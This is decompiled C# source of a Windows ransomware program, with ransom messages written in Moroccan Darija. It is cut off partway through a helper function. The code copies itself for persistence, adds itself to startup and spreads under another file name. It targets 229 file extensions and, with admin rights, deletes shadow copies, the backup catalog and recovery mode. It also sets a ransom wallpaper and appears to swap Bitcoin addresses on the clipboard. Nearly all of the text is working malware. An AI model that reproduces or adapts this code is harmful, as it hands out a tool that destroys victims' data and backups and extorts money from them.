using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "7yd";

	private static bool checkSpread = true;

	private static string spreadName = "Mofaja2a.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "Blamat7awlexe.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 2;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "9ra_oula_byelpc";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[7] { "Salam , 3refti ach daarti  ²_² jbedti n7l 3la rasek ou ga3 l files dyalk 3di .", "", "cho cho blama tkhaf ghayrj3 kolchi kif makan ou nasi7a blama temchi dir fiha nadi l task manager ", "ou tm7i l file XDD ", "atsifet l had ds invitation men tele oula la kan ma7lol 3dk db db db ou atsifet 10 dh orange darori ", "labghiiiiiti", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
